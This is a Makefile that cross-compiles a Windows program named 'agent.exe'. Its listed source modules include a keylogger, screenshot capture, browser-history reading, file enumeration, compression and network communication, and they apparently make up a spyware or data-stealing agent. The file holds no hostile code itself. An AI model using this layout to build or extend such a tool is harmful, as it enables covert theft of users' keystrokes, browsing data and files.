CC      = x86_64-w64-mingw32-gcc
CFLAGS  = -Wall -Wextra -O2 -I. -DSQLITE_OMIT_LOAD_EXTENSION
LDFLAGS = -lcurl -lws2_32 -liphlpapi -lgdi32 -lole32 -lshell32

TARGET = agent.exe
SRCS   = agent.c \
         core/system_info.c \
         core/screenshot.c \
         core/keylogger.c \
         core/browser_history.c \
         core/sqlite3.c \
         core/installed_apps.c \
         core/file_enum.c \
         core/miniz.c \
         network/ip.c \
         network/communication.c

.PHONY: all clean

all: $(TARGET)

$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

clean:
	rm -f $(TARGET)
